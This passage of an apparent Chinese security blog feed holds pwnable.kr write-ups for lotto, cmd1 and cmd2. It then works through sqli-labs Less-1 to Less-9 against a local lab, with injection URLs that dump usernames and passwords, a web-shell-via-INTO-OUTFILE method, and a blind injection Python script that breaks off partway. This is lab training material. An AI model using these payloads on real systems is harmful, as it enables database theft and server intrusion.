class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line"></div><div class="line">unsigned char submit[6];</div><div class="line"></div><div class="line">void play()&#123;</div><div class="line">	</div><div class="line">	int i;</div><div class="line">	printf(&quot;Submit your 6 lotto bytes : &quot;);</div><div class="line">	fflush(stdout);</div><div class="line"></div><div class="line">	int r;</div><div class="line">	r = read(0, submit, 6);</div><div class="line"></div><div class="line">	printf(&quot;Lotto Start!\n&quot;);</div><div class="line">	//sleep(1);</div><div class="line"></div><div class="line">	// generate lotto numbers</div><div class="line">	int fd = open(&quot;/dev/urandom&quot;, O_RDONLY);</div><div class="line">	if(fd==-1)&#123;</div><div class="line">		printf(&quot;error. tell admin\n&quot;);</div><div class="line">		exit(-1);</div><div class="line">	&#125;</div><div class="line">	unsigned char lotto[6];</div><div class="line">	if(read(fd, lotto, 6) != 6)&#123;</div><div class="line">		printf(&quot;error2. tell admin\n&quot;);</div><div class="line">		exit(-1);</div><div class="line">	&#125;</div><div class="line">	for(i=0; i&lt;6; i++)&#123;</div><div class="line">		lotto[i] = (lotto[i] % 45) + 1;		// 1 ~ 45</div><div class="line">	&#125;</div><div class="line">	close(fd);</div><div class="line">	</div><div class="line">	// calculate lotto score</div><div class="line">	int match = 0, j = 0;</div><div class="line">	for(i=0; i&lt;6; i++)&#123;</div><div class="line">		for(j=0; j&lt;6; j++)&#123;</div><div class="line">			if(lotto[i] == submit[j])&#123;</div><div class="line">				match++;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	// win!</div><div class="line">	if(match == 6)&#123;</div><div class="line">		system(&quot;/bin/cat flag&quot;);</div><div class="line">	&#125;</div><div class="line">	else&#123;</div><div class="line">		printf(&quot;bad luck...\n&quot;);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">void help()&#123;</div><div class="line">	printf(&quot;- nLotto Rule -\n&quot;);</div><div class="line">	printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;);</div><div class="line">	printf(&quot;your goal is to match lotto numbers as many as you can\n&quot;);</div><div class="line">	printf(&quot;if you win lottery for *1st place*, you will get reward\n&quot;);</div><div class="line">	printf(&quot;for more details, follow the link below\n&quot;);</div><div class="line">	printf(&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;);</div><div class="line">	printf(&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char* argv[])&#123;</div><div class="line"></div><div class="line">	// menu</div><div class="line">	unsigned int menu;</div><div class="line"></div><div class="line">	while(1)&#123;</div><div class="line"></div><div class="line">		printf(&quot;- Select Menu -\n&quot;);</div><div class="line">		printf(&quot;1. Play Lotto\n&quot;);</div><div class="line">		printf(&quot;2. Help\n&quot;);</div><div class="line">		printf(&quot;3. Exit\n&quot;);</div><div class="line"></div><div class="line">		scanf(&quot;%d&quot;, &amp;menu);</div><div class="line"></div><div class="line">		switch(menu)&#123;</div><div class="line">			case 1:</div><div class="line">				play();</div><div class="line">				break;</div><div class="line">			case 2:</div><div class="line">				help();</div><div class="line">				break;</div><div class="line">			case 3:</div><div class="line">				printf(&quot;bye\n&quot;);</div><div class="line">				return 0;</div><div class="line">			default:</div><div class="line">				printf(&quot;invalid menu\n&quot;);</div><div class="line">				break;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>&emsp;&emsp;代码如上，是一个猜数字游戏，输入ascii码在45以内的字符，然后从随机数文件/dev/urandom中读取6个字符，进行操作<code>lotto[i] = (lotto[i] % 45) + 1</code>。这题的关键在于下面的循环，这个循环让lotto[i]中的每个字符都和submit的6个字符比较一次。所以只要我们输入6个相同的字符，然后猜中6个lotto中的一个字符，就相当于成功比较了6次。运气比较好，第一次测试就通过了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">for(i=0; i&lt;6; i++)&#123;</div><div class="line">	for(j=0; j&lt;6; j++)&#123;</div><div class="line">		if(lotto[i] == submit[j])&#123;</div><div class="line">			match++;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int filter(char* cmd)&#123;</div><div class="line">        int r=0;</div><div class="line">        r += strstr(cmd, &quot;flag&quot;)!=0;</div><div class="line">        r += strstr(cmd, &quot;sh&quot;)!=0;</div><div class="line">        r += strstr(cmd, &quot;tmp&quot;)!=0;</div><div class="line">        return r;</div><div class="line">&#125;</div><div class="line">int main(int argc, char* argv[], char* * envp)&#123;</div><div class="line">        putenv(&quot;PATH=/fuckyouverymuch&quot;);</div><div class="line">        if(filter(argv[1])) return 0;</div><div class="line">        system( argv[1] );</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>&emsp;&emsp;科普一下putenv()是把字符串加到当前环境中，这里的路径会改变仅限于本程序。strstr()用户判断str2是否是str1的子串，是的话返回str2的首地址，否则返回null。所以cmd中不能包含”flag”,”sh”,”tmp”字符。然后目的是执行<code>system(&quot;/bin/cat flag&quot;)</code>。<br>&emsp;&emsp;通过符号链接把flag的名字改掉，再用新的进程调用cmd1。/* ln -s /home/cmd1/flag fucku */然而在我打*的时候反应过来上面都是废话，过滤flag的话使用`./cmd1 “/bin/cat fl*“就可以了。</p>
<h2 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int filter(char* cmd)&#123;</div><div class="line">        int r=0;</div><div class="line">        r += strstr(cmd, &quot;=&quot;)!=0;</div><div class="line">        r += strstr(cmd, &quot;PATH&quot;)!=0;</div><div class="line">        r += strstr(cmd, &quot;export&quot;)!=0;</div><div class="line">        r += strstr(cmd, &quot;/&quot;)!=0;</div><div class="line">        r += strstr(cmd, &quot;`&quot;)!=0;</div><div class="line">        r += strstr(cmd, &quot;flag&quot;)!=0;</div><div class="line">        return r;</div><div class="line">&#125;</div><div class="line"></div><div class="line">extern char** environ;</div><div class="line">void delete_env()&#123;</div><div class="line">        char** p;</div><div class="line">        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char* argv[], char** envp)&#123;</div><div class="line">        delete_env();</div><div class="line">        putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;);</div><div class="line">        if(filter(argv[1])) return 0;</div><div class="line">        printf(&quot;%s\n&quot;, argv[1]);</div><div class="line">        system( argv[1] );</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>&emsp;&emsp;这次过滤的更复杂</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwnable.kr&lt;br&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://www.wuweinan.top/tags/pwn/"/>
    
      <category term="writeup" scheme="http://www.wuweinan.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>SQL-lab writeup GET篇</title>
    <link href="http://www.wuweinan.top/2017/04/05/SQL-lab-writeup/"/>
    <id>http://www.wuweinan.top/2017/04/05/SQL-lab-writeup/</id>
    <published>2017-04-05T06:46:12.000Z</published>
    <updated>2017-05-01T03:38:18.819Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;这里的练习对象是sql-lab，是一个印度大佬完成后上传到github上的练习。所以通过<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a>下载，下面是简单的安装教程。</p>
<h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><blockquote>
<p>提前装好apache+php+MySQL,推荐使用Appserv等便捷套件</p>
<p>从<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a>下载解压到/www目录下</p>
<p>修改目录sql-lab\sql-connections下的db-creds文件中登入数据库的账号密码</p>
<p>打开浏览器进入sql-lab，点击页面中的<em>Setup/reset Database for labs</em>，就完成啦<br><a id="more"></a></p>
</blockquote>
<p><img src="http://i.imgur.com/09TcuBl.jpg" alt=""></p>
<p>正式进入lab前，也要掌握一定的sql语句以及函数，url的编码，例如%23是#（作为注释用）等。</p>
<blockquote>
<p>SQL注入的流程首先判断是什么类型的注入，在本lab中题目上有写</p>
<p>判断是否有注入点，在url参数后加上’号 或and 1=1 或and 1=2 查看返回信息是否有改变，返回错误信息一般就可以进行注入</p>
<p>另外，为了更好的学习SQL，在每个less的源码文件中加上<code>echo &quot;SQL:&quot;.$sql.&quot;&lt;br /&gt;&quot;;</code></p>
</blockquote>
<h4 id="Less-1-GET-Error-based-Single-quotes-String"><a href="#Less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Less-1 GET - Error based - Single quotes - String"></a>Less-1 GET - Error based - Single quotes - String</h4><p>根据题目，这是一个基于错误回显的单引号string注入，首先在url中加上单引号（注意是英文字符的单引号’或%27）<br><img src="http://i.imgur.com/XVFGfh6.png" alt=""></p>
<p>MySQL数据库回显了“MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1”，单引号不匹配嘛，这说明less-1没做任何过滤，只要在加上一个#或者%23，错误就消失了，因为后面多余的引号被注释掉了。</p>
<h5 id="猜表中字段数"><a href="#猜表中字段数" class="headerlink" title="猜表中字段数"></a>猜表中字段数</h5><p>select 1 表示选中第一个字段，以此类推select 1,2,3表示选择前三个字段，所以就猜吧。字段数不同时报错，如果猜中就正常返回。也可以使用order by测试。<br><img src="http://i.imgur.com/3ZTsDBb.png" alt=""><br><img src="http://i.imgur.com/CsypE1v.png" alt=""></p>
<p>答案就是三列，根据显示的name和password来看，应该是2,3列，第一列一般是用户id，所以未来的注入语句可以构造成<code>SELECT * FROM users WHERE id=&#39;1&#39; union select 1,2,注入语句#&#39; LIMIT 0,1</code>或<code>SELECT * FROM users WHERE id=&#39;1&#39; union select 1,注入语句,3#&#39; LIMIT 0,1</code>当然是放在后面比较方便</p>
<h5 id="获取当前数据库信息、用户信息"><a href="#获取当前数据库信息、用户信息" class="headerlink" title="获取当前数据库信息、用户信息"></a>获取当前数据库信息、用户信息</h5><p>单独使用database(),user()很麻烦，使用concat_ws()将其连接起来，concat_ws(char(58),database(),user())<br><img src="http://i.imgur.com/j4dmKSo.png" alt=""></p>
<h5 id="查询security中的表"><a href="#查询security中的表" class="headerlink" title="查询security中的表"></a>查询security中的表</h5><p>MySQL中有一个默认的系统数据库information_schema。记录了所有数据库的信息，包括表、字段、权限等。其中SCHEMA，TABLES，COLUMNS表是重点</p>
<p>直接上<a href="http://127.0.0.1:8080/sql-lab/Less-1/?id=4214214%27%20union" target="_blank" rel="external">http://127.0.0.1:8080/sql-lab/Less-1/?id=4214214%27%20union</a> select 1,2,table_name from information_schema.tables where table_schema=”security” limit 0,5%23<br><img src="http://i.imgur.com/zeroTbg.png" alt=""><br>这里的数据库名可以用双引号括起来也可以写上ascii码的十六进制数。因为php源码的原因，这里只打印一行信息，所以加上LIMIT 语句，将所有表名打印出来SELECT * FROM users WHERE id=’4214214’ union select 1,2,table_name from information_schema.tables where table_schema=”security” limit 0,5%23 最后将目标放在users表上</p>
<h5 id="查询users表中的字段名"><a href="#查询users表中的字段名" class="headerlink" title="查询users表中的字段名"></a>查询users表中的字段名</h5><p>方法同上，目标是columns表。直接上url使用limit将所有字段名打印出来。<a href="http://127.0.0.1:8080/sql-lab/Less-1/?id=4214214%27%20union%20select%201,2,column_name%20from%20information_schema.columns%20" target="_blank" rel="external">http://127.0.0.1:8080/sql-lab/Less-1/?id=4214214%27%20union%20select%201,2,column_name%20from%20information_schema.columns%20</a><br>where%20table_schema=%22security%22%20and%20table_name=%22users%22%20limit%200,5%23</p>
<p><img src="http://i.imgur.com/befdG9g.png" alt=""></p>
<p><img src="http://i.imgur.com/IQT5rmF.png" alt=""></p>
<p><img src="http://i.imgur.com/4fHorjv.png" alt=""></p>
<p><img src="http://i.imgur.com/9DNK4ah.png" alt=""></p>
<h5 id="一一列出想要的用户名和密码啦"><a href="#一一列出想要的用户名和密码啦" class="headerlink" title="一一列出想要的用户名和密码啦"></a>一一列出想要的用户名和密码啦</h5><p>将获取数据库信息的函数换成id,username,password就可以啦<br><a href="http://127.0.0.1:8080/sql-lab/Less-1/?id=-11%27%20union%20select%201,2,concat_ws(char(58),id,username,password)%20from%20users%20limit%201,5%23" target="_blank" rel="external">http://127.0.0.1:8080/sql-lab/Less-1/?id=-11%27%20union%20select%201,2,concat_ws(char(58),id,username,password)%20from%20users%20limit%201,5%23</a><br><img src="http://i.imgur.com/dcWyzJ8.png" alt=""></p>
<h4 id="Less-2-GET-Error-based-intiger-based"><a href="#Less-2-GET-Error-based-intiger-based" class="headerlink" title="Less-2 GET - Error based - intiger based"></a>Less-2 GET - Error based - intiger based</h4><p>既然是整型注入意思就是不用单引号闭合了。所以可以试一试and 1=1 和 and 1=2，可以发现不同啦，也就是说存在注入漏洞（当然了）<br><img src="http://i.imgur.com/oQh378z.png" alt=""></p>
<p><img src="http://i.imgur.com/TdwdXQz.png" alt=""></p>
<p>完整步骤的话和less-1一样，这里只上最终url了。<a href="http://127.0.0.1:8080/sql-lab/Less-2/?id=-1%20union%20select%201,2,concat_ws(char(58),id,username,password)%20from%20users%20limit%200,4%23" target="_blank" rel="external">http://127.0.0.1:8080/sql-lab/Less-2/?id=-1%20union%20select%201,2,concat_ws(char(58),id,username,password)%20from%20users%20limit%200,4%23</a></p>
<h4 id="Less-3-GET-Error-based-Single-quotes-with-twist-String"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-String" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist - String"></a>Less-3 GET - Error based - Single quotes with twist - String</h4><p>本less-3的id在括号中，除了闭合单引号还要闭合括号<br><a href="http://127.0.0.1:8080/sql-lab/Less-3/?id=-1%27)%20union%20select%201,2,concat_ws(char(58),id,username,password)%20from%20users%20limit%200,2%23" target="_blank" rel="external">http://127.0.0.1:8080/sql-lab/Less-3/?id=-1%27)%20union%20select%201,2,concat_ws(char(58),id,username,password)%20from%20users%20limit%200,2%23</a></p>
<h4 id="Less-4-GET-Error-based-Double-Quotes-String"><a href="#Less-4-GET-Error-based-Double-Quotes-String" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String"></a>Less-4 GET - Error based - Double Quotes - String</h4><p>除了单引号，还可能会使用双引号，在寻找漏洞的时候要把可能的情况试过来<br><a href="http://127.0.0.1:8080/sql-lab/Less-4/?id=-1&quot;)%20union%20select%201,2,concat_ws(char(58),id,username,password)%20from%20users%20limit%200,2%23" target="_blank" rel="external">http://127.0.0.1:8080/sql-lab/Less-4/?id=-1&quot;)%20union%20select%201,2,concat_ws(char(58),id,username,password)%20from%20users%20limit%200,2%23</a></p>
<h4 id="Less-5-GET-Double-Injection-Single-Quotes-String"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String"></a>Less-5 GET - Double Injection - Single Quotes - String</h4><p>题目中有写double injection，那么什么试双注入呢？先不管，测试一下<br><img src="http://i.imgur.com/PXQgueY.png" alt=""><br><img src="http://i.imgur.com/fk9me0j.png" alt=""><br>除了’you are in….’，并没有什么内容显示出来，至于原因看源码就知道了。<br>所以主要学习双查询注入。我通过网上的博客学习，这里附上连接:<a href="http://www.2cto.com/article/201303/192718.html" target="_blank" rel="external">http://www.2cto.com/article/201303/192718.html</a><br>顾名思义也许需要两个SELECT语句，然后通过concat连接起来，真正执行时，先从内部子查询进行，有个简单的例子:</p>
<p><code>SELECT CONCAT((SELECT databse())</code></p>
<p>另外，如此简单的一句话，进行注入的原理就是研究人员发现，在聚合函数后使用分组语句ORDER BY，会把查询的一部分以错误的形式打印出来，因此无论源码是否只打印’you are in…’，都可以看到想看到的东西了。</p>
<p>最后附上url:<br>?id=-1’ union select 1,count(<em>),concat((select username from users where id=3),floor(rand()</em>2))as a from users group by a%23<br><img src="http://i.imgur.com/Mr44Nca.png" alt=""><br><img src="http://i.imgur.com/gjOqGsU.png" alt=""></p>
<h4 id="Less-6-GET-Double-Injection-Double-Quotes-String"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String" class="headerlink" title="Less-6 GET - Double Injection - Double Quotes - String"></a>Less-6 GET - Double Injection - Double Quotes - String</h4><p>less-6和less-5的区别就是Double or Single Quotes。如果不打印出SQL语句的话，使用单引号’?id=1’来测试是不会出错的，因为双引号可以把单引号括进去，这时候需要单双引号混合使用，根据显示的语法错误信息判断。<br><img src="http://i.imgur.com/C5pMNGc.png" alt=""><br>剩下的注入部分和less-5的一模一样所以来重点讲一下count(*)这个聚合函数为什么和group在一起会产生这样的化学反应吧。把语句放在mysql中多次测试可以得到下面的结果:<br><img src="http://i.imgur.com/IBgmyYW.png" alt=""></p>
<p>count统计的数量是被group by分组以后的每一组数据的数量而不是分组数量，这里floor()的作用就体现出来了,出错的原因等明天问一下数据库老师吧= =最后上url:?id=-1%22union%20select%201,count(<em>),concat((select%20username%20from%20users%20where%20id=1),floor(rand()</em>2))as<br>%20a%20from%20users%20group%20by%20a%23</p>
<p><img src="http://i.imgur.com/yzye0ue.png" alt=""><br><img src="http://i.imgur.com/5RWy7GA.png" alt=""></p>
<h4 id="Less-7-GET-Dump-into-outfile-String"><a href="#Less-7-GET-Dump-into-outfile-String" class="headerlink" title="Less-7 GET - Dump into outfile - String"></a>Less-7 GET - Dump into outfile - String</h4><p>导出文件可以把一句话木马导入到一个新的test.php文件中，再用菜刀连接它。<br>常用的语句就是SELECT “一句话木马” into outfile “路径\test.php”，需要绝对路径才行。<br>@@datadir可以读取数据库路径，@@basedir获取MYSQL安装路径，这里使用上两题的方法获取:<br><img src="http://i.imgur.com/ymksHec.png" alt=""><br>被无情的拒绝了，因为less-7的源码中，把<code>print_r(mysql_error());</code>注释了，用一句固定的error信息回复，这是防御sql注入的一种方法。那就暂时去掉注释获得路径吧，如果是实际应用中，这种控制了错误回显的盲注我还不会。<br><img src="http://i.imgur.com/j2XwUFw.png" alt=""><br><img src="http://i.imgur.com/ZNmDVa1.png" alt=""></p>
<p>获得路径了，开始导入木马文件<br><img src="http://i.imgur.com/w5TZfPx.png" alt=""></p>
<p>没成功，因为–secure-file-priv影响了对文件的导入导出，我的my.ini中有<br><code>secure-file-priv=&quot;datadir=&quot;G:\AppServ/MySQL/Uploads&quot;</code><br>简单点把这句注释掉，重启mysql。成功导出文件后，可以上菜刀了。<br><img src="http://i.imgur.com/JFZHvlL.png" alt=""></p>
<h4 id="Less-8-Blind-Boolian-based-Single-Quotes"><a href="#Less-8-Blind-Boolian-based-Single-Quotes" class="headerlink" title="Less-8 Blind - Boolian based - Single Quotes"></a>Less-8 Blind - Boolian based - Single Quotes</h4><p>通过加引号等方法测试都得不到有效的信息，大概这里把<code>print_r(mysql_error())</code>注释了，所以双查询注入没用。</p>
<p>0x00 盲注</p>
<blockquote>
<p>盲注重视手工注入技巧，只有True和False获得的信息远没有普通注入多，难以采用工具进行注入。</p>
</blockquote>
<p>0x01 寻找注入点</p>
<blockquote>
<p>AND 1=1 和 AND 1=2 典型的利用True or False</p>
</blockquote>
<p>0x02 利用方法</p>
<blockquote>
<p>通常由一般方法、基于时间延迟方法、正则表达式方法等，less-8就是一般方法<br>‘a’的ascii码是64,所以就这么一个一个去试，就完成了，最好写个脚本<br>?id=1%27%20and%20ascii(substr((select%20database()),1,1))%3C64%20%23</p>
</blockquote>
<p><img src="http://i.imgur.com/9JEZntq.png" alt=""><br><img src="http://i.imgur.com/Wfoas02.png" alt=""></p>
<h4 id="Less-9-Blind-Timed-based-Single-Quotes"><a href="#Less-9-Blind-Timed-based-Single-Quotes" class="headerlink" title="Less-9 Blind - Timed based - Single Quotes"></a>Less-9 Blind - Timed based - Single Quotes</h4><p>less-9无论sql语是否有错都只显示’You are in …’，需要基于时间进行盲注。在less-8的基础上加上sleep(n)函数辅助判断，n单位是秒。<br>Less-9/?id=1%27%20and%20if(ascii(substr(database(),1,1))%3E115,0,sleep(5))%23<br>下述脚本来自:<a href="http://blog.csdn.net/u012763794/article/details/51207833" target="_blank" rel="external">http://blog.csdn.net/u012763794/article/details/51207833</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div></pre></td><td class="code"><pre><div class="line"># -*-coding:utf-8-*-  </div><div class="line">  </div><div class="line">&quot;&quot;&quot;  </div><div class="line">@version:   </div><div class="line">@author: giantbranch  </div><div class="line">@file: blindsqlinjection.py  </div><div class="line">@time: 2016/5/1   </div><div class="line">&quot;&quot;&quot;   </div><div class="line">  </div><div class="line">import urllib2  </div><div class="line">import urllib  </div><div class="line">  </div><div class="line">  </div><div class="line">success_str = &quot;You are in&quot;  </div><div class="line">getTable = &quot;users&quot;  </div><div class="line">  </div><div class="line">index = &quot;0&quot;  </div><div class="line">url = &quot;http://localhost/sqli-labs/Less-8/?id=1&quot;  </div><div class="line">database = &quot;database()&quot;  </div><div class="line">selectDB = &quot;select database()&quot;   </div><div class="line">selectTable = &quot;select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1&quot;  </div><div class="line">  </div><div class="line">  </div><div class="line">asciiPayload = &quot;&apos; and ascii(substr((%s),%d,1))&gt;=%d #&quot;  </div><div class="line">lengthPayload = &quot;&apos; and length(%s)&gt;=%d #&quot;  </div><div class="line">selectTableCountPayload = &quot;&apos;and (select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;)&gt;=%d #&quot;  </div><div class="line">  </div><div class="line">selectTableNameLengthPayloadfront = &quot;&apos;and (select length(table_name) from information_schema.tables where table_schema=&apos;%s&apos; limit &quot;   </div><div class="line">selectTableNameLengthPayloadbehind = &quot;,1)&gt;=%d #&quot;  </div><div class="line">  </div><div class="line">  </div><div class="line"># 发送请求，根据页面的返回的判断长度的猜测结果  </div><div class="line"># string:猜测的字符串 payload:使用的payload  length：猜测的长度  </div><div class="line">def getLengthResult(payload, string, length):  </div><div class="line">    finalUrl = url + urllib.quote(payload % (string, length))  </div><div class="line">    res = urllib2.urlopen(finalUrl)  </div><div class="line">    if success_str in res.read():  </div><div class="line">        return True  </div><div class="line">    else:  </div><div class="line">        return False  </div><div class="line">  </div><div class="line"># 发送请求，根据页面的返回的判断猜测的字符是否正确  </div><div class="line"># payload:使用的payload    string:猜测的字符串   pos：猜测字符串的位置    ascii：猜测的ascii  </div><div class="line">def getResult(payload, string, pos, ascii):  </div><div class="line">    finalUrl = url + urllib.quote(payload % (string, pos, ascii))  </div><div class="line">    res = urllib2.urlopen(finalUrl)  </div><div class="line">    if success_str in res.read():  </div><div class="line">        return True  </div><div class="line">    else:  </div><div class="line">        return False  </div><div class="line">  </div><div class="line"># 注入  </div><div class="line">def inject():  </div><div class="line">    # 猜数据库长度  </div><div class="line">    lengthOfDBName = getLengthOfString(lengthPayload, database)  </div><div class="line">    print &quot;length of DBname: &quot; + str(lengthOfDBName)  </div><div class="line">    # 获取数据库名称  </div><div class="line">    DBname = getName(asciiPayload, selectDB, lengthOfDBName)  </div><div class="line">      </div><div class="line">    print &quot;current database:&quot; + DBname  </div><div class="line">  </div><div class="line">    # 获取数据库中的表的个数  </div><div class="line">    # print selectTableCountPayload  </div><div class="line">    tableCount = getLengthOfString(selectTableCountPayload, DBname)  </div><div class="line">    print &quot;count of talbe:&quot; + str(tableCount)  </div><div class="line">  </div><div class="line">    # 获取数据库中的表  </div><div class="line">    for i in xrange(0,tableCount):  </div><div class="line">        # 第几个表  </div><div class="line">        num = str(i)  </div><div class="line">        # 获取当前这个表的长度  </div><div class="line">        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + 